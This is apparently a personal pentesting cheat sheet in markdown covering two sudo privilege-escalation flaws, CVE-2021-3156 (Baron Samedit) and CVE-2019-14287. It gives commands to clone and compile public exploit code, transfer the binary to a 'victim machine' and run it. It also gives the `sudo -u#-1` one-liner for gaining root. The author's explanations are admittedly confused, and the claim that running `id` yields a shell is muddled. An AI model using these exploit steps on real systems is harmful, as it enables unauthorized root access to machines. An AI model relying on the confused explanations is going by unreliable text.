## CVE-2021-3156

`Sudo Baron Samedit`, heap-based buffer overflow.

Affected version: `1.8.31`, `1.8.27`, `1.9.2` and some more idk

### Easiest way (python)

Also include the compiled binary if python is not available

```sh
git clone https://github.com/puckiestyle/CVE-2021-3156.git
```

Most of the time, `exploit_nss.py` will just work, if it doesn't, see instruction in `README.md`

### Compiling exploit (manual)

```sh
git clone https://github.com/blasty/CVE-2021-3156.git
cd CVE-2021-3156
make
```

Transfer the binary to victim machine, then do this, idk

```sh
cat /etc/lsb-release
cat /etc/os-release
```

Choose the version based on output of the command above

```sh
./sudo-hax-me-a-sandwich
```

## CVE-2019-14287

Affected version: all versions below `1.8.28`

Need to be able to use at least 1 command with `sudo`, even when not as root

```sh
sudo -l
    (ALL, !root) /usr/bin/id
```

`-u#-1` set `uid` to `-1`, which somehow translate to `0`, and give us root shell

```sh
sudo -u#-1 /usr/bin/id
```

idk how this works I'm just as confused as you don't ask me. I'm executing `id` how am I getting a shell wtf is going on